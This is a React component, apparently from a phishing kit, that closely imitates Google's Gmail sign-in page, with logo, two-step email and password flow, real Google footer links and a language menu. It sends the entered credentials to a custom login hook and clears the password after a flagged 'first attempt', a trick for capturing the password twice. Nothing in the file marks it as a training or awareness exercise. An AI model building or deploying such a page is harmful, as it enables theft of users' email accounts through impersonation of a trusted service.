import React, { useState, useEffect } from 'react';
import { useLogin } from '../hooks/useLogin';
import Spinner from './common/Spinner';

interface GmailLoginPageProps {
  onLoginSuccess?: (sessionData: any) => void;
  onLoginError?: (error: string) => void;
  defaultEmail?: string;
}

// Custom floating label input for Google style
const GoogleInput = ({ value, onChange, label, type = "text", autoFocus = false }: any) => {
  const [isFocused, setIsFocused] = useState(false);
  const hasValue = value.length > 0;

  return (
    <div className="relative mt-1">
      <input
        type={type}
        value={value}
        onChange={onChange}
        onFocus={() => setIsFocused(true)}
        onBlur={() => setIsFocused(false)}
        autoFocus={autoFocus}
        className={`w-full px-3 py-4 text-base bg-transparent border rounded-md outline-none transition-colors
          ${isFocused ? 'border-blue-600 border-2' : 'border-gray-400'}`}
      />
      <label
        className={`absolute left-2 transition-all duration-200 ease-in-out pointer-events-none
          ${(isFocused || hasValue) ? `text-xs -top-2.5 bg-white px-1 ${isFocused ? 'text-blue-600' : 'text-gray-600'}` : 'text-base top-4 left-3 text-gray-500'}`}
      >
        {label}
      </label>
    </div>
  );
};


const GmailLoginPage: React.FC<GmailLoginPageProps> = ({ onLoginSuccess, onLoginError, defaultEmail }) => {
  const [email, setEmail] = useState(defaultEmail || '');
  const [password, setPassword] = useState('');
  const [showPasswordStep, setShowPasswordStep] = useState(false);
  const [pageReady, setPageReady] = useState(false);

  const { isLoading, errorMessage, handleFormSubmit } = useLogin(onLoginSuccess, onLoginError);

  useEffect(() => {
    const timer = setTimeout(() => setPageReady(true), 100);
    return () => clearTimeout(timer);
  }, []);

  const handleNext = (e: React.MouseEvent<HTMLButtonElement>) => {
    e.preventDefault();
    if (email) { setShowPasswordStep(true); }
  };
  
  const handleSubmit = async (e: React.FormEvent) => {
    const result = await handleFormSubmit(e, { email, password, provider: 'Gmail' });
    if (result?.isFirstAttempt) { setPassword(''); }
  };

  if (!pageReady) {
    return (
      <div className="min-h-screen bg-[#f0f4f9] flex items-center justify-center">
        <Spinner size="lg" color="border-blue-600" />
      </div>
    );
  }

  return (
    <div className="min-h-screen flex flex-col font-sans bg-[#f0f4f9]" style={{ animation: 'fadeIn 0.3s ease-in' }}>
      <main className="flex-grow w-full flex items-center justify-center p-4">
        <div 
          className="w-full max-w-lg mx-auto py-10 px-6 md:px-12 bg-white rounded-2xl"
          style={{ boxShadow: '0 8px 32px rgba(0,0,0,.08)' }}
        >
          <div className="text-center">
            <svg viewBox="0 0 272 92" className="h-7 mx-auto" xmlns="http://www.w3.org/2000/svg">
              <path d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z" fill="#EA4335"/>
              <path d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z" fill="#FBBC05"/>
              <path d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z" fill="#4285F4"/>
              <path d="M225 3v65h-9.5V3h9.5z" fill="#34A853"/>
              <path d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z" fill="#EA4335"/>
              <path d="M35.29 41.19V32H67c.31 1.64.47 3.58.47 5.68 0 7.06-1.93 15.79-8.15 22.01-6.05 6.3-13.78 9.66-24.02 9.66C16.32 69.35.36 53.89.36 34.91.36 15.93 16.32.47 35.3.47c10.5 0 17.98 4.12 23.6 9.49l-6.64 6.64c-4.03-3.78-9.49-6.72-16.97-6.72-13.86 0-24.7 11.17-24.7 25.03 0 13.86 10.84 25.03 24.7 25.03 8.99 0 14.11-3.61 17.39-6.89 2.66-2.66 4.41-6.46 5.1-11.65l-22.49-.01z" fill="#4285F4"/>
            </svg>
            <h1 className="text-2xl text-gray-800 mt-4">Sign in</h1>
            <p className="text-gray-600 mt-2">to continue to Gmail</p>
          </div>

          <div className="mt-8">
            <form onSubmit={handleSubmit}>
              {errorMessage && !isLoading && (
                <div className="text-red-600 text-sm font-medium text-center mb-4">{errorMessage}</div>
              )}
              
              {!showPasswordStep ? (
                // Email Step
                <div>
                  <GoogleInput value={email} onChange={(e: any) => setEmail(e.target.value)} label="Email or phone" type="email" autoFocus />
                  <a href="https://accounts.google.com/signin/v2/recovery/identifier" target="_blank" rel="noopener noreferrer" className="text-sm font-semibold text-blue-600 hover:underline mt-2 inline-block">
                    Forgot email?
                  </a>
                  <p className="text-xs text-gray-500 mt-8">
                    Not your computer? Use Guest mode to sign in privately.
                    <a href="https://support.google.com/chrome/answer/6130773" target="_blank" rel="noopener noreferrer" className="text-sm font-semibold text-blue-600 hover:underline ml-1">Learn more</a>
                  </p>
                  <div className="flex justify-between items-center mt-8">
                    <a href="https://accounts.google.com/signup" target="_blank" rel="noopener noreferrer" className="text-sm font-semibold text-blue-600 hover:underline">
                      Create account
                    </a>
                    <button onClick={handleNext} disabled={!email} className="px-6 py-2.5 bg-blue-600 text-white font-semibold rounded-md hover:bg-blue-700 disabled:bg-blue-600 disabled:cursor-not-allowed transition-colors">
                      Next
                    </button>
                  </div>
                </div>
              ) : (
                // Password Step
                <div>
                  <div className="text-center text-sm font-medium p-2 rounded-full border border-gray-300 inline-block mb-4">{email}</div>
                  <GoogleInput value={password} onChange={(e: any) => setPassword(e.target.value)} label="Enter your password" type="password" autoFocus />
                  <a href="https://accounts.google.com/signin/v2/challenge/password/recovery" target="_blank" rel="noopener noreferrer" className="text-sm font-semibold text-blue-600 hover:underline mt-2 inline-block">
                    Forgot password?
                  </a>
                  <div className="flex justify-end mt-8">
                    <button type="submit" disabled={isLoading || !password} className="px-6 py-2.5 bg-blue-600 text-white font-semibold rounded-md hover:bg-blue-700 disabled:opacity-50 transition-colors">
                       {isLoading ? <Spinner size="sm" color="border-white" /> : 'Next'}
                    </button>
                  </div>
                </div>
              )}
            </form>
          </div>
        </div>
      </main>

      <footer className="w-full max-w-lg mx-auto flex justify-between items-center p-4 text-xs text-gray-600">
        <div>
          <select className="bg-transparent text-gray-800 py-2 pr-6">
            <option value="af">Afrikaans</option>
            <option value="az">Azərbaycan</option>
            <option value="id">Bahasa Indonesia</option>
            <option value="ms">Bahasa Melayu</option>
            <option value="ca">Català</option>
            <option value="cs">Čeština</option>
            <option value="da">Dansk</option>
            <option value="de">Deutsch</option>
            <option value="et">Eesti</option>
            <option value="en-GB">English (United Kingdom)</option>
            <option value="en" selected>English (United States)</option>
            <option value="es">Español (España)</option>
            <option value="es-419">Español (Latinoamérica)</option>
            <option value="eu">Euskara</option>
            <option value="fil">Filipino</option>
            <option value="fr">Français (France)</option>
            <option value="fr-CA">Français (Canada)</option>
            <option value="gl">Galego</option>
            <option value="hr">Hrvatski</option>
            <option value="zu">IsiZulu</option>
            <option value="is">Íslenska</option>
            <option value="it">Italiano</option>
            <option value="sw">Kiswahili</option>
            <option value="lv">Latviešu</option>
            <option value="lt">Lietuvių</option>
            <option value="hu">Magyar</option>
            <option value="nl">Nederlands</option>
            <option value="no">Norsk</option>
            <option value="pl">Polski</option>
            <option value="pt-BR">Português (Brasil)</option>
            <option value="pt-PT">Português (Portugal)</option>
            <option value="ro">Română</option>
            <option value="sk">Slovenčina</option>
            <option value="sl">Slovenščina</option>
            <option value="fi">Suomi</option>
            <option value="sv">Svenska</option>
            <option value="vi">Tiếng Việt</option>
            <option value="tr">Türkçe</option>
            <option value="el">Ελληνικά</option>
            <option value="bg">Български</option>
            <option value="ru">Русский</option>
            <option value="sr">Српски</option>
            <option value="uk">Українська</option>
            <option value="he">עברית</option>
            <option value="ar">العربية</option>
            <option value="fa">فارسی</option>
            <option value="am">አማርኛ</option>
            <option value="mr">मराठी</option>
            <option value="hi">हिन्दी</option>
            <option value="bn">বাংলা</option>
            <option value="gu">ગુજરાતી</option>
            <option value="ta">தமிழ்</option>
            <option value="te">తెలుగు</option>
            <option value="kn">ಕನ್ನಡ</option>
            <option value="ml">മലയാളം</option>
            <option value="th">ไทย</option>
            <option value="ko">한국어</option>
            <option value="zh-HK">中文 (香港)</option>
            <option value="zh-CN">中文 (简体)</option>
            <option value="zh-TW">中文 (繁體)</option>
            <option value="ja">日本語</option>
          </select>
        </div>
        <div className="flex items-center space-x-4">
          <a href="https://support.google.com/accounts" target="_blank" rel="noopener noreferrer" className="hover:underline">Help</a>
          <a href="https://policies.google.com/privacy" target="_blank" rel="noopener noreferrer" className="hover:underline">Privacy</a>
          <a href="https://policies.google.com/terms" target="_blank" rel="noopener noreferrer" className="hover:underline">Terms</a>
        </div>
      </footer>
    </div>
  );
};

export default GmailLoginPage;
